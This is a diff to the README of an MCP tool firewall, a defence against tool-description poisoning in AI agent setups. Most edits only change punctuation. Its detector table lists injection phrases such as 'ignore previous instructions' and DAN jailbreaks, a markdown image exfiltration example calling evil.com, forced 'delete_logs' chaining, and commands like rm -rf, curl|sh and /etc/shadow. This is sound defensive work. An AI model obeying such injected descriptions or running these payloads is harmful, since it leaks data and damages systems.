@@ -40,7 +40,7 @@ This creates a critical attack surface: **tool description poisoning**. A malici
 | **Obfuscated Payloads** | Base64-encoded attack instructions | Bypasses simple text filters |
 | **Description Anomalies** | 5000-char descriptions with hidden HTML comments | Overflow attacks hiding malicious content |
 
-The agent sees a tool called `get_weather` and trusts its description — it has no way to know the description is weaponized. **There is no MCP-native mechanism to detect or prevent this.**
+The agent sees a tool called `get_weather` and trusts its description - it has no way to know the description is weaponized. **There is no MCP-native mechanism to detect or prevent this.**
 
 ## Why This Solution?
 
@@ -57,19 +57,19 @@ Securing MCP in production requires answering two fundamentally different questi
 - **Firewall alone** can detect poisoned descriptions, but it cannot control *who* accesses tools, enforce per-agent rate limits, or provide session-level audit trails.
 - **Together**, they create defense-in-depth: agentgateway ensures only authorized agents reach MCP servers at controlled rates with full audit logging, while the firewall scans every tool description with 8 regex pattern detectors + 1 LLM-powered semantic detector, blocking anything scoring above the risk threshold.
 
-We then add **kagent** as the intelligence layer — an AI security auditor agent (powered by Claude) that uses the firewall's scanning tools via MCP to audit servers, generate reports, and respond to threats in natural language. All MCP servers are deployed as Kubernetes-native resources using **kmcp**, which manages the agentgateway sidecar pattern automatically.
+We then add **kagent** as the intelligence layer an AI security auditor agent that uses the firewall's scanning tools via MCP to audit servers, generate reports, and respond to threats in natural language. All MCP servers are deployed as Kubernetes-native resources using **kmcp**, which manages the agentgateway sidecar pattern automatically.
 
 ### Why agentgateway?
 
 [agentgateway](https://github.com/agentgateway/agentgateway) is the governance plane for all MCP traffic:
 
-- **MCP Authentication** — OAuth 2.0 / JWT validation for agent identity
-- **MCP Authorization** — CEL-based RBAC at the tool level: `'mcp.tool.name == "echo" && jwt.role == "operator"'`
-- **Rate Limiting** — Per-agent and global token-bucket throttling (e.g., 20 calls/min)
-- **Access Logging** — Structured audit trail with MCP-specific fields (`mcp.method`, `mcp.tool.name`, `mcp.session.id`)
-- **Multi-Target Routing** — Route agents to different security tiers (firewall-protected vs. direct)
-- **Admin UI** — Real-time visibility into all agent activity
-- **MCP Metrics** — Prometheus-compatible metrics for monitoring
+- **MCP Authentication** - OAuth 2.0 / JWT validation for agent identity
+- **MCP Authorization** - CEL-based RBAC at the tool level: `'mcp.tool.name == "echo" && jwt.role == "operator"'`
+- **Rate Limiting** - Per-agent and global token-bucket throttling (e.g., 20 calls/min)
+- **Access Logging** - Structured audit trail with MCP-specific fields (`mcp.method`, `mcp.tool.name`, `mcp.session.id`)
+- **Multi-Target Routing** - Route agents to different security tiers (firewall-protected vs. direct)
+- **Admin UI** - Real-time visibility into all agent activity
+- **MCP Metrics** - Prometheus-compatible metrics for monitoring
 
 ### Why MCP Tool Firewall?
 
@@ -138,7 +138,7 @@ Agent → agentgateway (:3000) → MCP Tool Firewall (:8888) → Upstream MCP Se
 | 8 regex detectors + 1 LLM detector | Prompt injection, data exfil, SSRF, jailbreaks, cross-tool manipulation, invisible chars, obfuscation, dangerous commands, semantic analysis |
 | Risk scoring | 0-100 composite score per tool. Above 51 = blocked |
 | Response scanning | Detects leaked secrets (AWS keys, JWTs), PII (SSNs, credit cards), and data leaks. Auto-redacts critical findings |
-| Kill switch | Emergency deny-all via API — blocks every tool instantly |
+| Kill switch | Emergency deny-all via API - blocks every tool instantly |
 | Policy engine | YAML-driven allowlists, blocklists, per-server trust levels |
 | Prometheus metrics | `/metrics` endpoint with Grafana dashboard included |
 | JSONL audit logs | Per-day logs with agentgateway identity (who made the request) |
@@ -199,14 +199,11 @@ kubectl apply -f deploy/k8s/grafana.yaml
 
 ### kagent Security Auditor (Optional)
 
-The security auditor agent uses Claude (via Anthropic API) as its LLM. You **must** provide a valid `ANTHROPIC_API_KEY` — without it, the agent will fail with `authentication_error`.
+The security auditor agent uses Claude (via Anthropic API) as its LLM. You **must** provide a valid `ANTHROPIC_API_KEY` without it, the agent will fail with `authentication_error`.
 
 kagent installs many default agents on resource-constrained clusters (e.g., kind), you may need to delete unused agents to free memory (see [Troubleshooting](#troubleshooting)).
 
 ```bash
-# Install kagent (needs a dummy OpenAI key at install, we use Anthropic for our agent)
-OPENAI_API_KEY=sk-dummy kagent install
-
 # Set your Anthropic API key (get one at https://console.anthropic.com/settings/keys)
 export ANTHROPIC_API_KEY="sk-ant-api03-your-key-here"
 
@@ -268,13 +265,13 @@ See [RUNBOOK.md](RUNBOOK.md) for the full step-by-step demo walkthrough.
 |---|----------|----------|
 | 1 | Prompt Injection | "ignore previous instructions", `<<SYS>>` tags, jailbreaks (DAN, persona hijacking) |
 | 2 | Data Exfiltration | External URLs in descriptions, markdown image exfil (`![](https://evil.com/?d=...)`) |
-| 3 | Cross-Tool Manipulation | "first call delete_logs, then..." — forced tool chaining |
+| 3 | Cross-Tool Manipulation | "first call delete_logs, then..."  forced tool chaining |
 | 4 | Invisible Characters | Zero-width spaces, RTL overrides, homoglyphs |
 | 5 | Obfuscated Payloads | Base64 blobs, `eval()`, hex sequences |
 | 6 | Description Anomalies | >2000 char descriptions, high entropy, HTML comments |
 | 7 | Dangerous Commands | `rm -rf`, `curl\|sh`, `os.system()`, `/etc/shadow` |
 | 8 | SSRF / Internal Access | `169.254.169.254`, `localhost`, private IPs, cloud metadata endpoints |
-| 9 | Semantic Analysis | LLM-powered (Claude) — catches paraphrased attacks that regex misses. Optional, requires `ANTHROPIC_API_KEY` |
+| 9 | Semantic Analysis | LLM-powered (Claude) catches paraphrased attacks that regex misses. Optional, requires `ANTHROPIC_API_KEY` |
 
 Each tool gets a risk score (0-100). Above 51 = blocked. Above 26 = warning logged.
 
@@ -340,10 +337,10 @@ policies:
 
 The firewall is designed to run behind [agentgateway](https://github.com/agentgateway/agentgateway):
 
-- **Gateway lockdown** — Firewall only accepts traffic from trusted agentgateway IPs (`--trusted-gateways`)
-- **Identity headers** — Reads `X-Agentgateway-User`, `X-Agentgateway-Role`, `X-Agentgateway-Request-Id` for identity-aware audit logs
-- **Multi-target routing** — agentgateway routes `/mcp` through the firewall, `/direct` straight to upstream
-- **Streamable HTTP** — Firewall speaks MCP Streamable HTTP (SSE) natively
+- **Gateway lockdown** - Firewall only accepts traffic from trusted agentgateway IPs (`--trusted-gateways`)
+- **Identity headers** - Reads `X-Agentgateway-User`, `X-Agentgateway-Role`, `X-Agentgateway-Request-Id` for identity-aware audit logs
+- **Multi-target routing** - agentgateway routes `/mcp` through the firewall, `/direct` straight to upstream
+- **Streamable HTTP** - Firewall speaks MCP Streamable HTTP (SSE) natively
 
 ## kagent Integration
 
@@ -376,7 +373,7 @@ Or open the kagent dashboard:
 
 ```bash
 kagent dashboard
-# Opens http://localhost:8501 — navigate to mcp-security-auditor
+# Opens http://localhost:8501 - navigate to mcp-security-auditor
 ```
 
 Manifest: [`deploy/k8s/kagent-security-agent.yaml`](deploy/k8s/kagent-security-agent.yaml)
@@ -385,8 +382,8 @@ Manifest: [`deploy/k8s/kagent-security-agent.yaml`](deploy/k8s/kagent-security-a
 
 | Project | Role |
 |---------|------|
-| [agentgateway](https://github.com/agentgateway/agentgateway) | Governance — auth, routing, rate limiting, observability |
-| [kagent](https://kagent.dev) | Kubernetes AI agent framework — security auditor using firewall MCP tools |
+| [agentgateway](https://github.com/agentgateway/agentgateway) | Governance - auth, routing, rate limiting, observability |
+| [kagent](https://kagent.dev) | Kubernetes AI agent framework - security auditor using firewall MCP tools |
 | [kmcp](https://github.com/kagent-dev/kmcp) | Deploys MCP servers as Kubernetes CRDs |
 
 ---
@@ -463,7 +460,7 @@ tests/                      # 46 tests
 - [agentgateway](https://github.com/agentgateway/agentgateway)
 - [kagent](https://kagent.dev)
 - [kmcp](https://github.com/kagent-dev/kmcp)
-- [Runbook](RUNBOOK.md) — step-by-step demo walkthrough
+- [Runbook](RUNBOOK.md) - step-by-step walkthrough
 - [Blog Post](docs/BLOG.md)
 
 ## License
